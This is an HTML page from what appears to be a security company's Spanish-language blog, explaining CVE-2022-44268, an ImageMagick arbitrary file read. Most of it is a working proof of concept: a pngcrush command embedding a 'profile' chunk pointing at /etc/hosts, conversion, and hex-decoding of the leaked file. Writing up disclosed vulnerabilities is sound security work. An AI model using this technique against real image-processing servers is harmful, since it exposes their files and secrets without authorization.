@@ -1,0 +1,325 @@
+<!doctype html>
+<html lang="es">
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="generator" content="Pelican Static Site Generator, Powered by Python" />
+    <meta name="description" content="Recientemente se han descubierto dos vulnerabilidades en ImageMagick 7.1.0-49: un DoS (CVE-2022-44267) y un Information Disclosure (CVE-2022-44268). Nos vamos a centrar en esta última ya que creo que es bastante más interesante.">
+    <meta name="keywords" content="Vulnerabilidad, articulos">
+    <meta name="author" content="Ethergroup">
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:site" content="">
+    <meta name="twitter:title" content="ImageMagick: la vulnerabilidad oculta detrás de tus imágenes online">
+    <meta name="twitter:description" content="Recientemente se han descubierto dos vulnerabilidades en ImageMagick 7.1.0-49: un DoS (CVE-2022-44267) y un Information Disclosure (CVE-2022-44268). Nos vamos a centrar en esta última ya que creo que es bastante más interesante.">
+    <meta name="twitter:image" content="/articulos/041-Img/preview1.png">
+    <meta property="og:title" content="ImageMagick: la vulnerabilidad oculta detrás de tus imágenes online">
+    <meta property="og:type" content="article">
+    <meta property="og:url" content="/articulos/041-Img/">
+    <meta property="og:image" content="/articulos/041-Img/preview1.png">
+    <meta property="og:description" content="Recientemente se han descubierto dos vulnerabilidades en ImageMagick 7.1.0-49: un DoS (CVE-2022-44267) y un Information Disclosure (CVE-2022-44268). Nos vamos a centrar en esta última ya que creo que es bastante más interesante.">
+    <meta property="og:site_name" content="Ethergroup | Blog">
+    <title>ImageMagick: la vulnerabilidad oculta detrás de tus imágenes online - Ethergroup | Blog</title>
+    <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" href="/theme/images/icon-hires.png" sizes="192x192" />
+    <link rel="icon" href="/theme/images/icon-normal.png" sizes="128x128" />
+    <link rel="apple-touch-icon" href="/theme/images/apple-touch-icon.png" />
+    <link rel="apple-touch-icon" href="/theme/images/apple-touch-icon-76x76.png" sizes="76x76" />
+    <link rel="apple-touch-icon" href="/theme/images/apple-touch-icon-120x120.png" sizes="120x120" />
+    <link rel="apple-touch-icon" href="/theme/images/apple-touch-icon-152x152.png" sizes="152x152" />
+    <link rel="apple-touch-icon" href="/theme/images/apple-touch-icon-180x180.png" sizes="180x180" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/5.1.3/css/bootstrap.min.css" integrity="sha512-GQGU0fMMi238uA+a/bdWJfpUGKUkBdgfFdgBm72SUQ6BeyWjoY/ton0tEjH+OSH9iP4Dfh+7HM0I9f5eR0L/4w==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" integrity="sha512-1ycn6IcaQQ40/MKBW2W4Rhis/DbILU74C1vSrLJxCq57o941Ym01SwNsOMqvEBFlcgUa6xLiPY/NS5R+E6ztJQ==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Noto+Sans&display=swap" />
+    <link rel="stylesheet" href="/theme/css/movimientolibre-bs5.css" />
+</head>
+<body>
+<nav id="navigationBase" class="navbar navbar-expand-sm fixed-top">
+    <div class="container">
+        <a class="navbar-brand" href="/"><i class="fa fa-home"></i></a>
+        <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navigationCollapse" aria-controls="navigationCollapse" aria-expanded="false" aria-label="Toggle navigation">
+            <span class="fas fa-bars"></span>
+        </button>
+        <div class="collapse navbar-collapse" id="navigationCollapse">
+            <ul class="navbar-nav me-auto mb-2 mb-sm-0">
+                <li class="nav-item"><a class="nav-link" href="/authors.html">Autores</a></li>
+                <li class="nav-item"><a class="nav-link" href="/tags.html">Etiquetas</a></li>
+                <li class="nav-item"><a class="nav-link" href="https://ethergroup.mx/">EtherGroup</a></li>
+            </ul>
+            <ul class="navbar-nav">
+                <li><a class="mx-2" href="https://www.instagram.com/ethergroup/" target="_blank"><i class="fab fa-instagram-square fa-2x"></i></a></li>
+                <li><a class="mx-2" href="https://www.facebook.com/EtherGroup-184831138858274" target="_blank"><i class="fab fa-facebook-square fa-2x"></i></a></li>
+                <li><a class="mx-2" href="https://www.linkedin.com/company/ethergroup" target="_blank"><i class="fab fa-linkedin fa-2x"></i></a></li>
+            </ul>
+    </div>
+    </div>
+</nav><header id="headerSite" class="mb-4">
+    <div id="headerSiteImage" class="container" itemscope itemtype="http://schema.org/Organization">
+        <div class="row">
+            <div class="col-xl-8">
+                <h1 class="display-2" itemprop="name">Ethergroup | Blog</h1>
+                <p class="lead" itemprop="description">Blog sobre tecnologías, hacking, ciberseguridad, software libre y mucho más</p>
+            </div>
+        </div>
+    </div>
+</header>    <div class="container">
+        <div class="row">
+            <div class="col-lg-8">
+    <article>
+        <script type="application/ld+json">
+            {
+                "@context": "http://schema.org",
+                "@type": "Article",
+                "publisher": {
+                    "@type": "Organization",
+                    "name": "Ethergroup | Blog",
+                    "logo": {
+                        "@type": "ImageObject",
+                        "url": "/theme/images/ethergroup.png"
+                    },
+                    "url": ""
+                },
+                "author": "Ethergroup",
+                "name": "ImageMagick: la vulnerabilidad oculta detrás de tus imágenes online",
+                "headline": "ImageMagick: la vulnerabilidad oculta detrás de tus imágenes online",
+                "description": "Recientemente se han descubierto dos vulnerabilidades en ImageMagick 7.1.0-49: un DoS (CVE-2022-44267) y un Information Disclosure (CVE-2022-44268). Nos vamos a centrar en esta última ya que creo que es bastante más interesante.",
+                "dateCreated": "2023-02-05 10:00:00-06:00",
+                "datePublished": "2023-02-05 10:00:00-06:00",
+                "dateModified": "",
+                "image": "/articulos/041-Img/preview1.png",
+                "url": "/articulos/041-Img/"
+            }
+        </script>
+        <h2>ImageMagick: la vulnerabilidad oculta detrás de tus imágenes online</h2>
+        <p class="lead">Recientemente se han descubierto dos vulnerabilidades en ImageMagick 7.1.0-49: un DoS (CVE-2022-44267) y un Information Disclosure (CVE-2022-44268). Nos vamos a centrar en esta última ya que creo que es bastante más interesante.</p>
+        <p>05 February 2023</p>
+        <p><img class="img-fluid" src="041.png" alt="Foto 1"></p>
+<hr>
+<p>Cuando se agrega un fragmento de texto (por ejemplo, tEXt), si la palabra clave es la cadena "profile" (sin comillas), ImageMagick interpreta la cadena de texto como un nombre de archivo y carga el contenido como un profile sin procesar (si el binario de ImageMagick tiene permisos para leerlo). </p>
+<p>El resultado es que un atacante podría aprovechar ésto para leer arbitrariamente ficheros de un servidor que utiliza ImageMagick para procesar imágenes...</p>
+<p>La PoC es además supersencilla.</p>
+<ol>
+<li>
+<p>Primero instalamos las dependencias:</p>
+<div class="highlight"><pre><span></span><code>$ apt-get install pngcrush imagemagick exiftool exiv2 -y
+</code></pre></div>
+
+</li>
+<li>
+<p>Añadimos el chunk de texto con el nombre del fichero que queremos leer:</p>
+<div class="highlight"><pre><span></span><code>$ pngcrush -text a <span class="s2">&quot;profile&quot;</span> <span class="s2">&quot;/etc/hosts&quot;</span> hacker.png
+
+Recompressing IDAT chunks <span class="k">in</span> hacker.png to pngout.png
+Total length of data found <span class="k">in</span> critical <span class="nv">chunks</span>            <span class="o">=</span>    <span class="m">319742</span>
+Best pngcrush <span class="nv">method</span>        <span class="o">=</span>  <span class="m">10</span> <span class="o">(</span>ws <span class="m">15</span> fm <span class="m">6</span> zl <span class="m">9</span> zs <span class="m">1</span><span class="o">)</span> <span class="o">=</span>    <span class="m">328105</span>
+
+CPU <span class="nb">time</span> decode <span class="m">0</span>.043105, encode <span class="m">0</span>.648451, other <span class="m">0</span>.002684, total <span class="m">0</span>.696421 sec
+</code></pre></div>
+
+</li>
+<li>
+<p>Ahora tratamos la imagen con ImageMagick para explotar la vulnerabilidad, en el ejemplo simplemente con el comando convert pero en un entorno real podría detonarse simplemente subiéndo la imágen a un servidor vulnerable:</p>
+<div class="highlight"><pre><span></span><code>$ convert pngout.png oculto.png
+convert-im6.q16: keyword <span class="s2">&quot;Raw profile type &quot;</span>: bad character <span class="s1">&#39;0x20&#39;</span> <span class="sb">`</span>oculto.png<span class="err">&#39;</span> @ warning/png.c/MagickPNGWarningHandler/1668.
+</code></pre></div>
+
+</li>
+</ol>
+<p><img class="img-fluid" src="042.png" alt="Foto 2"></p>
+<p>Y ya está, ahora simplemente vemos el contenido incrustado en la imagen resultante (te lo resalto en amarillo):</p>
+<div class="highlight"><pre><span></span><code>$ identify -verbose oculto.png
+Image:
+Filename: oculto.png
+Format: PNG <span class="o">(</span>Portable Network Graphics<span class="o">)</span>
+Mime type: image/png
+Class: DirectClass
+Geometry: 512x512+0+0
+Resolution: <span class="m">118</span>.11x118.11
+Print size: <span class="m">4</span>.33494x4.33494
+Units: PixelsPerCentimeter
+Colorspace: sRGB
+Type: TrueColor
+Base type: Undefined
+Endianness: Undefined
+Depth: <span class="m">8</span>-bit
+Channel depth:
+    red: <span class="m">8</span>-bit
+    green: <span class="m">8</span>-bit
+    blue: <span class="m">8</span>-bit
+Channel statistics:
+    Pixels: <span class="m">262144</span>
+    Red:
+    min: <span class="m">0</span>  <span class="o">(</span><span class="m">0</span><span class="o">)</span>
+    max: <span class="m">255</span> <span class="o">(</span><span class="m">1</span><span class="o">)</span>
+    mean: <span class="m">88</span>.2626 <span class="o">(</span><span class="m">0</span>.346128<span class="o">)</span>
+    standard deviation: <span class="m">73</span>.5068 <span class="o">(</span><span class="m">0</span>.288262<span class="o">)</span>
+    kurtosis: -0.553267
+    skewness: <span class="m">0</span>.75696
+    entropy: <span class="m">0</span>.960805
+    Green:
+    min: <span class="m">0</span>  <span class="o">(</span><span class="m">0</span><span class="o">)</span>
+    max: <span class="m">255</span> <span class="o">(</span><span class="m">1</span><span class="o">)</span>
+    mean: <span class="m">120</span>.885 <span class="o">(</span><span class="m">0</span>.474058<span class="o">)</span>
+    standard deviation: <span class="m">90</span>.0684 <span class="o">(</span><span class="m">0</span>.35321<span class="o">)</span>
+    kurtosis: -1.5098
+    skewness: <span class="m">0</span>.223454
+    entropy: <span class="m">0</span>.953738
+    Blue:
+    min: <span class="m">0</span>  <span class="o">(</span><span class="m">0</span><span class="o">)</span>
+    max: <span class="m">255</span> <span class="o">(</span><span class="m">1</span><span class="o">)</span>
+    mean: <span class="m">130</span>.047 <span class="o">(</span><span class="m">0</span>.50999<span class="o">)</span>
+    standard deviation: <span class="m">85</span>.4641 <span class="o">(</span><span class="m">0</span>.335153<span class="o">)</span>
+    kurtosis: -1.51198
+    skewness: <span class="m">0</span>.0835374
+    entropy: <span class="m">0</span>.971014
+Image statistics:
+    Overall:
+    min: <span class="m">0</span>  <span class="o">(</span><span class="m">0</span><span class="o">)</span>
+    max: <span class="m">255</span> <span class="o">(</span><span class="m">1</span><span class="o">)</span>
+    mean: <span class="m">113</span>.065 <span class="o">(</span><span class="m">0</span>.443392<span class="o">)</span>
+    standard deviation: <span class="m">83</span>.0131 <span class="o">(</span><span class="m">0</span>.325542<span class="o">)</span>
+    kurtosis: -1.33275
+    skewness: <span class="m">0</span>.359084
+    entropy: <span class="m">0</span>.961852
+Rendering intent: Perceptual
+Gamma: <span class="m">0</span>.454545
+Chromaticity:
+    red primary: <span class="o">(</span><span class="m">0</span>.64,0.33<span class="o">)</span>
+    green primary: <span class="o">(</span><span class="m">0</span>.3,0.6<span class="o">)</span>
+    blue primary: <span class="o">(</span><span class="m">0</span>.15,0.06<span class="o">)</span>
+    white point: <span class="o">(</span><span class="m">0</span>.3127,0.329<span class="o">)</span>
+Background color: white
+Border color: srgb<span class="o">(</span><span class="m">223</span>,223,223<span class="o">)</span>
+Matte color: grey74
+Transparent color: black
+Interlace: None
+Intensity: Undefined
+Compose: Over
+Page geometry: 512x512+0+0
+Dispose: Undefined
+Iterations: <span class="m">0</span>
+Compression: Zip
+Orientation: Undefined
+Profiles:
+    Profile-icc: <span class="m">672</span> bytes
+Properties:
+    date:create: <span class="m">2023</span>-02-05T18:35:18+00:00
+    date:modify: <span class="m">2023</span>-02-05T18:35:18+00:00
+    exif:BitsPerSample: <span class="m">8</span>, <span class="m">8</span>, <span class="m">8</span>
+    exif:ColorSpace: <span class="m">1</span>
+    exif:DateTime: <span class="m">2023</span>:02:05 <span class="m">12</span>:24:50
+    exif:ExifOffset: <span class="m">190</span>
+    exif:ImageLength: <span class="m">512</span>
+    exif:ImageWidth: <span class="m">512</span>
+    exif:Software: GIMP <span class="m">2</span>.10.30
+    exif:thumbnail:BitsPerSample: <span class="m">8</span>, <span class="m">8</span>, <span class="m">8</span>
+    exif:thumbnail:Compression: <span class="m">6</span>
+    exif:thumbnail:ImageLength: <span class="m">256</span>
+    exif:thumbnail:ImageWidth: <span class="m">256</span>
+    exif:thumbnail:JPEGInterchangeFormat: <span class="m">328</span>
+    exif:thumbnail:JPEGInterchangeFormatLength: <span class="m">13885</span>
+    exif:thumbnail:PhotometricInterpretation: <span class="m">6</span>
+    exif:thumbnail:SamplesPerPixel: <span class="m">3</span>
+    icc:copyright: Public Domain
+    icc:description: GIMP built-in sRGB
+    icc:manufacturer: GIMP
+    icc:model: sRGB
+    png:bKGD: chunk was found <span class="o">(</span>see Background color, above<span class="o">)</span>
+    png:cHRM: chunk was found <span class="o">(</span>see Chromaticity, above<span class="o">)</span>
+    png:iCCP: chunk was found
+    png:IHDR.bit-depth-orig: <span class="m">8</span>
+    png:IHDR.bit_depth: <span class="m">8</span>
+    png:IHDR.color-type-orig: <span class="m">2</span>
+    png:IHDR.color_type: <span class="m">2</span> <span class="o">(</span>Truecolor<span class="o">)</span>
+    png:IHDR.interlace_method: <span class="m">0</span> <span class="o">(</span>Not interlaced<span class="o">)</span>
+    png:IHDR.width,height: <span class="m">512</span>, <span class="m">512</span>
+    png:pHYs: <span class="nv">x_res</span><span class="o">=</span><span class="m">11811</span>, <span class="nv">y_res</span><span class="o">=</span><span class="m">11811</span>, <span class="nv">units</span><span class="o">=</span><span class="m">1</span>
+    png:text: <span class="m">23</span> tEXt/zTXt/iTXt chunks were found
+    png:tIME: <span class="m">2023</span>-02-05T18:35:18Z
+    Raw profile type:
+
+    <span class="m">220</span>
+3132372e302e302e31096c6f63616c686f73740a3132372e302e312e31096b79616b750a
+0a232054686520666f6c6c6f77696e67206c696e65732061726520646573697261626c65
+20666f7220495076362063617061626c6520686f7374730a3a3a3120202020206970362d
+6c6f63616c686f7374206970362d6c6f6f706261636b0a666530303a3a30206970362d6c
+6f63616c6e65740a666630303a3a30206970362d6d636173747072656669780a66663032
+3a3a31206970362d616c6c6e6f6465730a666630323a3a32206970362d616c6c726f7574
+6572730a
+
+    signature: 1218350006b7307477b7ba227324971bbf78de7a384d3ab2c12b0984f6fade13
+    unknown: <span class="m">1</span>
+Artifacts:
+    filename: oculto.png
+    verbose: <span class="nb">true</span>
+Tainted: False
+Filesize: 340862B
+Number pixels: <span class="m">262144</span>
+Pixels per second: <span class="m">26</span>.1417MB
+User time: <span class="m">0</span>.010u
+Elapsed time: <span class="m">0</span>:01.010
+Version: ImageMagick <span class="m">6</span>.9.11-60 Q16 x86_64 <span class="m">2021</span>-01-25 https://imagemagick.org
+</code></pre></div>
+
+<p>¿Lo has visto verdad? En hexadecimal...</p>
+<div class="highlight"><pre><span></span><code>$ python3 -c <span class="s1">&#39;print(bytes.fromhex(&quot;texto_en_hexadecimal&quot;).decode(&quot;utf-8&quot;))&#39;</span>
+
+
+$ python3 -c <span class="s1">&#39;print(bytes.fromhex(&quot;3132372e302e302e31096c6f63616c686f73740a3132372e302e312e31096b79616b750a0a232054686520666f6c6c6f77696e67206c696e65732061726520646573697261626c6520666f7220495076362063617061626c6520686f7374730a3a3a3120202020206970362d6c6f63616c686f7374206970362d6c6f6f706261636b0a666530303a3a30206970362d6c6f63616c6e65740a666630303a3a30206970362d6d636173747072656669780a666630323a3a31206970362d616c6c6e6f6465730a666630323a3a32206970362d616c6c726f75746572730a&quot;).decode(&quot;utf-8&quot;))&#39;</span>
+<span class="m">127</span>.0.0.1    localhost
+<span class="m">127</span>.0.1.1    kyaku
+
+<span class="c1"># The following lines are desirable for IPv6 capable hosts</span>
+::1     ip6-localhost ip6-loopback
+fe00::0 ip6-localnet
+ff00::0 ip6-mcastprefix
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+</code></pre></div>
+
+<p>Fuentes:</p>
+<p><a href="https://www.metabaseq.com/imagemagick-zero-days/">https://www.metabaseq.com/imagemagick-zero-days/</a></p>
+<p><a href="https://github.com/agathanon/cve-2022-44268">https://github.com/agathanon/cve-2022-44268</a></p>
+<p><a href="https://github.com/duc-nt/CVE-2022-44268-ImageMagick-Arbitrary-File-Read-PoC">https://github.com/duc-nt/CVE-2022-44268-ImageMagick-Arbitrary-File-Read-PoC</a></p>
+    </article>
+            </div>
+            <div class="col-lg-4">
+                <aside>
+<div id="asideAbout" class="card border-0">
+    <div class="card-body">
+        <h3 class="card-title mt-0">A cerca de EtherGroup</h3>
+        <p class="card-text">
+            Ethergroup es una empresa mexicana dedicada 
+            a proveer servicios integrales en tecnologías
+            de Información. Lideramos la transformación 
+            tecnológica de nuestros clientes paso a paso, 
+            de forma segura y fungimos como impulso a su 
+            negocio en esta era digital.
+            <br> <br>
+            En Ethergroup nos encanta compartir 
+            contenido te dejamos este espacio, 
+            que busca divulgar conocimiento de 
+            diferentes áreas.
+        </p>
+    </div>
+</div><div id="asideTags" class="card border-0">
+    <div class="card-body">
+        <h3 class="card-title mt-0">Etiquetas</h3>
+        <ul class="list-group list-group-flush">
+<li class="list-group-item"><a href="/tag/ciberataque.html">Ciberataque</a></li><li class="list-group-item"><a href="/tag/ciberataques.html">Ciberataques</a></li><li class="list-group-item"><a href="/tag/ciberseguridad.html">Ciberseguridad</a></li><li class="list-group-item"><a href="/tag/hacking.html">Hacking</a></li><li class="list-group-item"><a href="/tag/linux.html">Linux</a></li><li class="list-group-item"><a href="/tag/malware.html">Malware</a></li><li class="list-group-item"><a href="/tag/programacion.html">Programación</a></li><li class="list-group-item"><a href="/tag/ransomware.html">Ransomware</a></li><li class="list-group-item"><a href="/tag/servidores.html">Servidores</a></li><li class="list-group-item"><a href="/tag/vulnerabilidad.html">Vulnerabilidad</a></li>        </ul>
+    </div>
+</div>                </aside>
+            </div>
+        </div>
+    </div>
+<footer class="text-muted">
+    <div class="container">
+        <p>
+            Copyright &copy; Ethergroup 2021 | Cybersecurity E-group S. de R.L. de C.V. Sitio web de la empresa Ethergroup.
+            Sitio web de la empresa <a href="https://ethergroup.mx/">EtherGroup.</a> 
+        </p>
+    </div>
+</footer>    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" integrity="sha512-894YE6QWD5I59HgZOGReFYm4dnWc1Qt5NtvYSaNcOP+u1T9qYdvdihz0PPSiiqn/+/3e7Jo4EaG7TubfWGUrMQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/5.1.3/js/bootstrap.min.js" integrity="sha512-OvBgP9A2JBgiRad/mM36mkzXSXaJE9BEIENnVEmeZdITvwT09xnxLtT4twkCa8m/loMbPHsvPl0T8lRGVBwjlQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+    <script src="/theme/js/navigation.js"></script>
+</body>
+</html>
